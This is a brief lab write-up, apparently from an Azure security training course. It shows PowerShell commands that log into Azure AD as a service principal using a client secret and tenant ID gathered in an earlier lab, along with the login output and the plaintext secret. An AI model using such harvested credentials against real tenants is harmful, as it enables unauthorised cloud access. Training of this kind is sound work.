# Attack Lab 11

Using the pharmacorp tenant identifier and credentials obtained on the attack lab 4, it's possible abuse of the credentials in Azure AD:

```
Import-Module C:\AzAppsec\Tools\AzureAD\AzureAD\2.0.2.140\AzureAD.psd1
$password= ConvertTo-SecureString '~9j8Q~f339gnUfSBxSO5yuQXM6ztfCBL8LPjXa3I' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('7e7730b1-29ab-4adf-bb20-7ae61987d01f', $password)
Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant e0f999c1-86ee-47a0-bfd5-18470154b7cd
WARNING: The provided service principal secret will be included in the 'AzureRmContext.json' file found in the user
profile ( C:\Users\studentuser107\.Azure ). Please ensure that this directory has appropriate protections.

Account                              SubscriptionName TenantId                             Environment
-------                              ---------------- --------                             -----------
7e7730b1-29ab-4adf-bb20-7ae61987d01f                  e0f999c1-86ee-47a0-bfd5-18470154b7cd AzureCloud

```

